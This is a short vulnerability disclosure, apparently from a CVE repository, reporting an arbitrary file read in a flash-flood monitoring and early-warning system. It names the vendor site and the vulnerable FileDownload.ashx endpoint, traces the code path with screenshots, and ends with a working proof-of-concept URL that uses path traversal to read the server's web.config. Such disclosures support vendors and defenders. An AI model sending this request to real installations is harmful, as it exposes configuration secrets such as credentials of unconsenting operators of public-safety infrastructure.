Flash flood disaster monitoring and early warning system 2.0 has arbitrary file reading vulnerability

official website:http://www.cdwanjiang.com/

Vulnerability location:\Service\FileDownload.ashx

![WPS图片(1)](https://github.com/nagenanhai/cve/assets/42707759/b362165a-3d52-496d-891a-e6cb3a244f5f)

Tracking class:

\bin\MFCW.Web.dll
// MFCW.Web.Service.FileDownload

![WPS图片(2)](https://github.com/nagenanhai/cve/assets/42707759/cc35748c-dd08-4266-a740-465dbd4a3bfe)

Enter the Download function:

![WPS图片(3)](https://github.com/nagenanhai/cve/assets/42707759/67b316b0-717f-4bca-9594-6a5cdd36ee20)

Enter the ResponseFile function:

![WPS图片(5)](https://github.com/nagenanhai/cve/assets/42707759/e4b352ad-ac30-4f60-a37a-016aa03cebde)

POC：
```
http://xx.xx.xx.xx/Service/FileDownload.ashx?Files=../../web.config&FileSaveName=web
```
![WPS图片(4)](https://github.com/nagenanhai/cve/assets/42707759/0b9c2afb-42cc-446e-9ca3-55295a8f1c97)
